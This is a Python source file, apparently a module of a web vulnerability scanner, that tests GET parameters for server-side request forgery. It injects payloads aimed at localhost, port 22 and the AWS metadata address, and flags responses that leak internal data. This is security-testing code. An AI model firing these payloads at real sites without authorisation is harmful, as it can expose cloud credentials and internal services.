import urllib.parse
from ..http_engine import HTTPEngine

class SSRFSkill:
    def __init__(self):
        self.name = "SSRF (Server-Side Request Forgery)"
        self.ssrf_params = ["url", "uri", "dest", "redirect", "path", "image", "src", "link", "target"]
        # Payloads that force the server to hit internal endpoints
        self.payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/", # AWS Metadata
            "http://[::1]:80"
        ]

    async def run(self, target: dict, engine: HTTPEngine) -> list:
        findings = []
        url = target["url"]
        method = target["method"]
        
        if method != "GET":
            return findings

        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param_name in params:
            if any(sp == param_name.lower() for sp in self.ssrf_params):
                for payload in self.payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True)).geturl()
                    
                    # In a real SSRF, the server hangs or returns internal data.
                    # We flag it if the response time is long or it returns internal text.
                    response = await engine.request("GET", test_url)
                    
                    if response and response.status_code == 200:
                        if "root:x:0:0" in response.text or "instance-id" in response.text or "127.0.0.1" in response.text:
                            findings.append({
                                "skill": self.name,
                                "target": test_url,
                                "issue": f"Potential SSRF in parameter '{param_name}'",
                                "severity": "Critical",
                                "evidence": f"Server returned internal data for payload: {payload}",
                                "poc": f"Visit this URL:\n{test_url}"
                            })
        return findings
